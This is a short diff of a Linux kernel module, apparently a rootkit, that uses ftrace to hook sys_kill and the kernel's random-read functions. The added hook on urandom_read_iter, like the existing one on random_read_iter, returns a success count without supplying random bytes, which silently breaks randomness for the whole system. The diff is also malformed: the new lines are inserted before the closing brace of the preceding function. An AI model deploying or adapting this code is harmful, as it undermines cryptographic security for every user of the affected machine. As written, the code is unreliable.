@@ -132,12 +132,18 @@ static asmlinkage ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct i
 
 static asmlinkage ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter) {
   return iter->count;
+
+static asmlinkage ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
+
+static asmlinkage ssize_t hook_urandom_read_iter(struct kiocb *kiocb, struct iov_iter *iter) {
+  return iter->count;
 }
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
+    HOOK("urandom_read_iter", hook_urandom_read_iter, &orig_urandom_read_iter),
 };
 
 /* Module initialization function */
